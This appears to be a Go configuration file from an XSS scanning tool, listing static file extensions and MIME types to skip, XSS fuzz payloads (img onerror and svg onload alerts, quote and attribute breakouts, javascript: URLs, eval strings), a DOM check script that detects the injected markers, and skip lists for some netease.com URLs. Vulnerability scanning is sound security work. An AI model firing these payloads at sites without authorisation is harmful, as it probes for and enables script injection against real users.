package main

var StaticSuffix = []string{
	"png", "gif", "jpg", "ico", "svg",
	"mp4", "mp3",
	"mng", "pct", "bmp", "jpeg", "pst", "psp",
	"ttf", "tif", "tiff", "eot", "otf",
	"ai", "drw", "wma", "ogg", "wav", "ra", "aac", "mid", "au", "aiff",
	"dxf", "eps", "ps", "svg", "3gp", "asf", "asx", "avi", "mov", "mpg", "qt", "rm",
	"wmv", "m4a", "bin", "xls", "xlsx", "ppt", "pptx", "doc", "docx", "odt", "ods", "odg",
	"odp", "exe", "zip", "rar", "tar", "gz", "iso", "rss", "pdf", "txt", "dll",
	"gz2", "apk", "crt", "woff", "map", "woff2", "webp", "less", "dmg", "bz2", "swf",
	"flv", "mpeg", "dat", "xsl", "csv", "cab", "exif", "wps", "m4v", "rmvb",
	"m3u8",

	"js", "css", "json",
}

//https://en.wikipedia.org/wiki/Media_type
var StaticMimeType = []string{
	"image/gif",
	"image/png",
	"image/jpeg",
	"image/bmp",
	"image/webp",
	"image/apng",
	"image/avif",
	"image/flif",
	"image/x-icon",
	"image/vnd.microsoft.icon",
	"image/svg+xml",
	"image/x-mng",
	"audio/mpeg",
	"audio/ogg",
	"audio/*",
	"audio/midi",
	"audio/webm",
	"audio/wav",
	"audio/x-pn-wav",
	"audio/wave",
	"audio/x-wav",
	"video/mp4",
	"video/ogg",
	"video/webm",
	"application/ogg",
}

//////////
// fuzz payloads
var XssPayloads = []string{
	// normal
	`<img src=1 onerror=alert(20220510)
	/>`,
	//html tag
	`'"></Textarea></Script><hivesec>`,
	`'"></Textarea></Script><svg onload=alert(20220510)>`,
	//html attr
	`' hivesec=88 c='`,
	`" hivesec=88 c="`,
	"` hivesec=88 c=`",
	`c hivesec=88 `,
	//script中 js中插入变量 ,//eval: eval('this.'+arg[0]+'="'+arg[1]+'";');
	// `";tangsan(1);//`,
	// `';tangsan(1);//'`,
	`\x3chivesec\x3e`,
	`'-(20220510)-'`,
	`"-(20220510)-"`,
	`eval('alert(20220510)');void`,
	`\u003hivesec\u003e`,
	// 直接eval
	`alert(20220510)`,
	// swager xss:https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter
	// `https://gist.githubusercontent.com/LeoHuang2015/0078717cabc0d2c3c861976ef28286f7/raw/e06366a0ef5d009dc883a5406d96b8394446ef28/gistfile1.txt`,
}

var XssPayloadsFragement = []string{
	//window.location=x
	`javascript:alert(20220510);//https://`,
	// eval
	`alert(20220510);//`,
	`\x3chivesec\x3e`,
}

var XssPayloadsInpath = []string{
	// 插入到url path中
	`\x3chivesec\x3e`,
	`'-(20220510)-'`,
	`"-(20220510)-'`,
}

var PromptTextFlag = "20220510"

// check js
var CheckExpr = `()=> 
(function(){
	var vul_str;
	//针对html tag和attr，存在即有漏洞
	try {
		var a = document.querySelector("hivesec") || document.querySelector("[hivesec]") ;
		if (a) {
			vul_str =  a.outerHTML;
			return vul_str;
		}
	} catch(e) {
		error_info = e;
	}

	//针对插入到js中，需要分析js里面的内容
	try {
		const globalRegex1 = new RegExp('"-(20220510)-"', 'g');
		const globalRegex2 = new RegExp('\'-(20220510)-\'', 'g'); 
		var nodeList = document.querySelectorAll("script");
		for(var i= 0; i< nodeList.length; i ++){
			var html = nodeList[i].innerHTML;
			if ( globalRegex1.test(html) ) {
				vul_str = html;
			}else if (globalRegex2.test(html)){
				vul_str = html;
			}
		}
	}catch(e){
		error_info = e;
	}
	return vul_str
}())
`

// blacklist
var DomainBlackList = []string{
	"https://login.netease.com/",
}

var UrlBlackList = []string{
	`https://login.netease.com`,
	`http://zs.nie.netease.com/app/game/download_link`,
}
